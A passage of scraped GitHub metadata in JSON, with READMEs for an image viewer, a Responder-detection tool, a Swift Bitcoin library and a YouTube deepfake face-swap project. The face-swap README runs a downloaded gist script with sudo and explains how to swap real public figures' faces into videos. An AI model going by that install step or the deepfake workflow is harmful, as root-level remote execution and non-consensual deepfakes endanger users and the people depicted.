:{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":18},"websiteUrl":""},"repository":{"name":"goiv","primaryLanguage":{"name":"Go"},"license":"GNU General Public License v3.0","isArchived":false,"hasWikiEnabled":true,"forkCount":7,"readme_md":{"text":"## goiv\n\nSmall and simple image viewer written in pure Go.\n\n\n### Features\n\n* Supports JPEG, PNG, GIF, BMP, PCX, TIFF, PBM, PGM, PPM, WEBP, PSD and TGA formats.\n* Scales images to window size and preserves aspect ratio.\n* Supports HTTP URLs passed as arguments.\n* Cross-platform (note: on macOS you need to install [XQuartz](https://www.xquartz.org/)).\n\n![screenshot](https://goo.gl/1Qgqwm)\n\n\n### Download\n\n - [Linux 64bit](https://github.com/gen2brain/goiv/releases/download/1.0/goiv-1.0-linux-64bit.tar.gz)\n - [Windows 32bit](https://github.com/gen2brain/goiv/releases/download/1.0/goiv-1.0-windows-32bit.zip)\n - [macOS 64bit](https://github.com/gen2brain/goiv/releases/download/1.0/goiv-1.0-darwin-64bit.zip)\n\n\n### Installation\n\n    go get -v github.com/gen2brain/goiv\n\n\nThis will install app in `$GOPATH/bin/goiv`.\n\nNote: On Windows you need to generate manifest .syso file, use this instead:\n\n    go get github.com/akavel/rsrc\n    \n    go get -d github.com/gen2brain/goiv\n    go generate github.com/gen2brain/goiv\n    go install github.com/gen2brain/goiv\n\n\n### Keybindings\n\n* j / Right / PageDown / Space\n\n    `Next image`\n\n* k / Left / PageUp\n\n    `Previous image`\n\n* f / F11\n\n    `Fullscreen`\n\n* [ / ]\n\n    `Go 10 images back/forward`\n\n* , / .\n\n    `Go to first/last image`\n\n* q / Escape\n\n    `Quit`\n\n* Enter\n\n    `Print current image path to stdout`\n\n\n### Example usage\n\n* View all images in a directory\n\n    `goiv /path/to/dir/*`\n\n* View all JPEG's in all subdirectories\n\n    `find . -iname \"*.jpg\" | goiv`\n\n* Delete current image when enter is pressed\n\n    `goiv * | xargs rm`\n\n* Rotate current image when enter is pressed\n\n    `goiv * | xargs -i convert -rotate 90 {} {}`\n\n\n### Planned features\n\n- [ ] draw in console on DRM/KMS and Framebuffer (partially implemented) \n- [ ] flip image vertically/horizontally\n- [ ] rotate image 90 degrees clockwise/counter-clockwise\n","byteSize":1879},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":137},"createdAt":"2018-02-05T22:52:09Z","updatedAt":"2018-02-16T20:44:12Z","pushedAt":"2018-02-08T22:10:19Z","description":"Small and simple image viewer written in pure Go.","subscribersCount":{"totalCount":5},"diskUsage":31,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":2},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":12}}},"tags":{"totalCount":1},"releases":{"totalCount":1},"type":"user"},"siteAdmin":"false"},{"user":{"login":"codeexpress","followers":{"totalCount":17},"repositories":{"totalCount":5},"following":{"totalCount":0},"location":null,"organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":""},"repository":{"name":"respounder","primaryLanguage":{"name":"Go"},"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":true,"forkCount":10,"readme_md":{"text":"<img src=\"https://i.imgur.com/o1Gya0D.png\" width=300px />\n\n# res·pound·er\n   <span>/rɪˈspaʊnd dər/</span></span>\n   <i>noun</i>\n   <ul>\n   <li>\n   <div style=\"margin-left:10px; display:inline;\">\n   A tool that detects presence of a <a href=https://github.com/SpiderLabs/Responder>Responder</a> in the network\n   </div>\n   </li>\n   <li>\n   <div style=\"margin-left:10px; display:inline;\">\n   Identifies compromised machines before hackers run away with the loot (hashes)\n   </div>\n   </li>\n   </ul>\n\n   Respounder sends LLMNR name resolution requests for made-up hostnames that do not exist.\n   In a normal non-adversarial network we do not expect such names to resolve.\n   However, a responder, if present in the network, will resolve such queries\n   and therefore will be forced to reveal itself.\n\n## Download\n\n### Latest Releases\nRespounder is available for 32/64 bit linux, OS X and Windows systems.\nLatest versions can be downloaded from the [Release](https://github.com/codeexpress/respounder/releases) tab above.\n\n### Build from source\nThis is a golang project with no dependencies. Assuming you have golang compiler installed,\nthe following will build the binary from scratch\n```\n$ git clone https://github.com/codeexpress/respounder\n$ cd respounder\n$ go build respounder\n```\n\n## Usage\n\nRunning `respounder` is as simple as invoking it on the command line.\nExample invocation:\n```bash\n$ ./respounder\n\n\n     .´/\n    / (           .----------------.\n    [ ]░░░░░░░░░░░|// RESPOUNDER //|\n    ) (           '----------------'\n    '-'\n\n[wlan0]    Sending probe from 192.168.0.19...   responder not detected\n[vmnet1]   Sending probe from 172.16.211.1...   responder not detected\n[vmnet8]   Sending probe from 172.16.55.1...    responder detected at 172.16.55.128\n```\n\n### Flags\n\n```\n$ ./respounder [-json] [-debug]\n\nFlags:\n  -json\n        Prints a JSON to STDOUT if a responder is detected on\n        network. Other text is sent to STDERR\n  -debug\n        Creates a debug.log file with a trace of the program\n  -help\n        Displays this help\n```\n\n\n### Typical usage scenario\n\n#### Personal\nDetect rogue hosts running responder on public Wi-Fi networks\ne.g. like Airports, Cafés and avoid joining such networks\n(especially if you are running windows OS)\n\n#### Corporate\nDetect network compromises as soon as they happen by running respounder\nin a loop\n\nFor eg. the following `crontab` runs respounder every minute and logs a JSON file to syslog\nwhenever a responder is detected.\n```bash\n* * * * * /path/to/respounder -json | /usr/bin/logger -t responder-detected\n```\n\nExample `syslog` entry:\n```bash\ncode@express:~/$ sudo tail -f /var/log/syslog\nFeb  9 03:44:07 responder-detected: [{\"interface\":\"vmnet8\",\"responderIP\":\"172.16.55.128\",\"sourceIP\":\"172.16.55.1\"}]\n```\n\n## Demo\n![Respounder in action](https://i.imgur.com/ymcDRnJ.gif)\n\n## Coming Up Next: Android App\nThere are plans to port this tool to an android app so that adversarial Wi-Fi networks\n(eg. WiFi Pineapple or WiFi Pumpkin running responder) can be\ndetected right from a mobile phone.\n","byteSize":3080},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":145},"createdAt":"2018-02-05T04:42:14Z","updatedAt":"2018-02-17T08:00:55Z","pushedAt":"2018-02-15T20:16:38Z","description":"Respounder detects presence of responder in the network.","subscribersCount":{"totalCount":11},"diskUsage":12,"pullRequestsOpen":{"totalCount":2},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":4},"commits":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":3}}}]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":6}}},"tags":{"totalCount":1},"releases":{"totalCount":1},"type":"user"},"siteAdmin":"false"},{"user":{"login":"kishikawakatsumi","followers":{"totalCount":1377},"repositories":{"totalCount":81},"following":{"totalCount":38},"location":"Tokyo","organizations":{"totalCount":7},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":24}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":16}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":7}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}}],"totalCount":36},"websiteUrl":"https://kishikawakatsumi.com"},"repository":{"name":"BitcoinKit","primaryLanguage":{"name":"Swift"},"license":"Apache License 2.0","isArchived":false,"hasWikiEnabled":false,"forkCount":19,"readme_md":{"text":"BitcoinKit\n===========\n[![CI Status](http://img.shields.io/travis/kishikawakatsumi/BitcoinKit.svg)](https://travis-ci.org/kishikawakatsumi/BitcoinKit)\n[![codecov](https://codecov.io/gh/kishikawakatsumi/BitcoinKit/branch/master/graph/badge.svg)](https://codecov.io/gh/kishikawakatsumi/BitcoinKit)\n[![Carthage compatible](https://img.shields.io/badge/Carthage-compatible-4BC51D.svg?style=flat)](https://github.com/Carthage/Carthage)\n[![Version](https://img.shields.io/cocoapods/v/BitcoinKit.svg)](http://cocoadocs.org/docsets/BitcoinKit)\n[![Platform](https://img.shields.io/cocoapods/p/BitcoinKit.svg)](http://cocoadocs.org/docsets/BitcoinKit)\n\nBitcoinKit implements Bitcoin protocol in Swift. It is an implementation of the Bitcoin SPV protocol written (almost) entirely in swift.\n\n<img src=\"https://user-images.githubusercontent.com/40610/35793683-0d497b4e-0a96-11e8-8e49-2b0ce09211a4.png\" width=\"320px\" />&nbsp;<img src=\"https://user-images.githubusercontent.com/40610/35793685-0da36a32-0a96-11e8-855b-ecbc3ce1474c.png\" width=\"320px\" />\n\nFeatures\n--------\n\n- Send/receive transactions.\n- See current balance in a wallet.\n- Encoding/decoding addresses: P2PKH, WIF format.\n- Transaction building blocks: inputs, outputs, scripts.\n- EC keys and signatures.\n- BIP32, BIP44 hierarchical deterministic wallets.\n- BIP39 implementation.\n\nUsage\n-----\n\n#### Creating new wallet\n\n```swift\nlet privateKey = PrivateKey(network: .testnet) // You can choose .mainnet or .testnet\nlet wallet = Wallet(privateKey: privateKey)\n```\n\n#### Import wallet from WIF\n\n```swift\nlet wallet = try Wallet(wif: \"92pMamV6jNyEq9pDpY4f6nBy9KpV2cfJT4L5zDUYiGqyQHJfF1K\")\n```\n\n#### Hierarchical Deterministic Wallet\n\n```swift\n// Generate mnemonic\nlet mnemonic = try Mnemonic.generate()\n\n// Generate seed from the mnemonic\nlet seed = Mnemonic.seed(mnemonic: mnemonic)\n\nlet wallet = HDWallet(seed: seed, network: .testnet)\n```\n\n#### Key derivation\n\n```\nlet mnemonic = try Mnemonic.generate()\nlet seed = Mnemonic.seed(mnemonic: mnemonic)\n\nlet privateKey = HDPrivateKey(seed: seed, network: .testnet)\n\n// m/0'\nlet m0prv = try! privateKey.derived(at: 0, hardened: true)\n\n// m/0'/1\nlet m01prv = try! m0prv.derived(at: 1)\n\n// m/0'/1/2'\nlet m012prv = try! m01prv.derived(at: 2, hardened: true)\n```\n\n#### HD Wallet Key derivation\n\n```\nlet keychain = HDKeychain(seed: seed, network: .mainnet)\nlet privateKey = try! keychain.derivedKey(path: \"m/44'/1'/0'/0/0\")\n...\n```\n\n#### Extended Keys\n\n```\nlet extendedKey = privateKey.extended()\n```\n\n#### Sync blockchain\n\n```\nlet blockStore = try! SQLiteBlockStore.default()\nlet blockChain = BlockChain(wallet: wallet, blockStore: blockStore)\n\nlet peerGroup = PeerGroup(blockChain: blockChain)\nlet peerGroup.delegate = self\n\nlet peerGroup.start()\n```\n\nInstallation\n------------\n\n### Carthage\n\nBitcoinKit is available through [Carthage](https://github.com/Carthage/Carthage). To install\nit, simply add the following line to your Cartfile:\n\n`github \"kishikawakatsumi/BitcoinKit\"`\n\n### CocoaPods\n\nBitcoinKit is available through [CocoaPods](http://cocoapods.org). To install\nit, simply add the following lines to your Podfile:\n\n```ruby\nuse_frameworks!\npod 'BitcoinKit'\n```\n\nContribute\n----------\n\nFeel free to open issues, drop us pull requests or contact us to discuss how to do things.\n\nEmail: [kishikawakatsumi@mac.com](mailto:kishikawakatsumi@mac.com)\n\nTwitter: [@k_katsumi](http://twitter.com/k_katsumi)\n\n\nLicense\n-------\n\nBitcoinKit is available under the Apache 2.0 license. See the LICENSE file for more info.\n","byteSize":3507},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":323},"createdAt":"2018-02-05T06:33:53Z","updatedAt":"2018-02-16T15:26:32Z","pushedAt":"2018-02-14T01:06:09Z","description":"Bitcoin protocol toolkit for Swift","subscribersCount":{"totalCount":10},"diskUsage":1529,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":27},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":10},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":9},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":12},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":62}}},"tags":{"totalCount":3},"releases":{"totalCount":3},"type":"user"},"siteAdmin":"false"},{"user":{"login":"DerWaldi","followers":{"totalCount":12},"repositories":{"totalCount":1},"following":{"totalCount":4},"location":"Germany","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":"https://melodyscanner.com"},"repository":{"name":"youtube-video-face-swap","primaryLanguage":{"name":"Python"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":21,"readme_md":{"text":"# YouTube Video Face Swap using \"DeepFakes\" Autoencoder-Model\n\n## Overview\n\nThe aim of this project ist to perform a face swap on a youtube video almost automatically.<br />\nThe only step where a human is needed is the quality in step 1.5.\n\n### How does it work?\nSiraj Raval explains that pretty good in his video:<br/>\nhttps://www.youtube.com/watch?v=7XchCsYtYMQ&feature=youtu.be\n\n## Installation\n\n### My Setup\n\nI am using a desktop PC with one GTX1060 running ubuntu server 16.04.<br />\nTraining the model for 100.000 epochs takes me about 30 hours. \n\n### Install packages from apt\n```\nsudo apt-get install ffmpeg x264 libx264-dev\n```\n#### Install xvfb for virtual screen\n```\nsudo apt-get install xvfb  \n```\n#### Install chromedriver for image scraping\n```\nwget https://gist.githubusercontent.com/ziadoz/3e8ab7e944d02fe872c3454d17af31a5/raw/ff10e54f562c83672f0b1958a144c4b72c070158/install.sh\nsudo sh ./install.sh\n```\n### Install required libraries\n```\npip install -r requirements.txt\n```\n\n## Usage\n\n### Step 1: Fetch Training Data\nScrape face images of two persons from google images.\n```\npython3 1_get_faces.py --name=\"angela merkel\" --limit=500\npython3 1_get_faces.py --name=\"taylor swift\" --limit=500\n```\nOr scrape face images from youtube videos (e.g. interviews).\n```\npython3 1_get_faces_from_yt.py --url=\"https://www.youtube.com/watch?v=XtHwjrm4sMg\" --start=30 --stop=200 --name=\"siraj raval\" --limit=500\npython3 1_get_faces_from_yt.py --url=\"https://www.youtube.com/watch?v=kwRM4PQdheE\" --start=60 --stop=179 --name=\"kal penn\" --limit=500\n```\n### Step 1.5: The Human Eye\n\nHave a look at the extracted face images in \"data/faces/\"!\nThere will appear some missextractions, just delete the images that don't fit.\n\n### Step 2: Train Model\nTrain the faceswap model with the collected face images.<br/>\nIn this example Merkel's face will be inserted on Taylor Swift.\n```\npython3 2_train.py --src=\"angela merkel\" --dst=\"taylor swift\" --epochs=100000\n```\n\n### Pre-trained Model\n\nYou can download a pre trained model for Angela Swift [here](https://anonfile.com/Ec8a61ddbf/Angela_Swift.zip)<br/>\nJust place the \"models\" folder next to the code directory.\n\n### Step 3: Apply Face Swap on YouTube Video\nPerform facesqp on a youtube video.<br/>\nThe \"--start\" and \"--stop\" parameters define in seconds where to clip the video.<br/>\nSet \"--gif\" to \"True\" if you want to export the generated video as gif file. \n```\npython3 3_youtube_face_swap.py --url=\"https://www.youtube.com/watch?v=XnbCSboujF4\" --start=0 --stop=60 --gif=False\n```\n\n## Examples\nDonald Trump as Nicolas Cage:<br/>\n![Example GIF](https://github.com/DerWaldi/youtube-video-face-swap/blob/master/example.gif?raw=true \"Example gif\")\n<br/>\nAngela Merkel as Taylor Swift:<br/>\n![Example2 GIF](https://github.com/DerWaldi/youtube-video-face-swap/blob/master/examples2.gif?raw=true \"Example2 gif\")<br/>\n[Video with better quality](https://github.com/DerWaldi/youtube-video-face-swap/raw/master/examples2.mp4)\n<br/>\n![Example3 GIF](https://github.com/DerWaldi/youtube-video-face-swap/blob/master/example3.gif?raw=true \"Example3 gif\")<br/>\n[Video with better quality](https://github.com/DerWaldi/youtube-video-face-swap/raw/master/example3.mp4)<br/>\n<br/>\nThe first two exampels are trained with images scraped from google, that's why the swapped faces look a bit frozen. <br/>\nThe last one was trained using only two videos of interviews.<br/>\nYou can see that it can transfer facial expressions much better than the ones trained with static images.\n\n\n## What's coming next?\n\nSince I am more into audio processing, I would like to transfer the concept of face swapping on music signals.<br/>\nIf you have any suggestions, please let me know.\n\n## Credits\n\nhttps://github.com/deepfakes/faceswap\n\nhttps://github.com/rushilsrivastava/image-scrapers\n\nhttps://gist.github.com/ziadoz/3e8ab7e944d02fe872c3454d17af31a5\n\nSpecial thanks goes to Siraj Raval who inspired me to this project!<br/>\nhttps://github.com/llSourcell/deepfakes\n","byteSize":3978},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":102},"createdAt":"2018-02-04T17:05:26Z","updatedAt":"2018-02-17T01:56:09Z","pushedAt":"2018-02-09T20:57:19Z","description":"The aim of this project ist to perform a face swap on a youtube video almost automatically.","subscribersCount":{"totalCount":7},"diskUsage":60277,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":22}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"kelseyhightower","followers":{"totalCount":5973},"repositories":{"totalCount":170},"following":{"totalCount":13},"location":"Portland, OR","organizations":{"totalCount":1},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":8}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":11}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":36}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":5},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{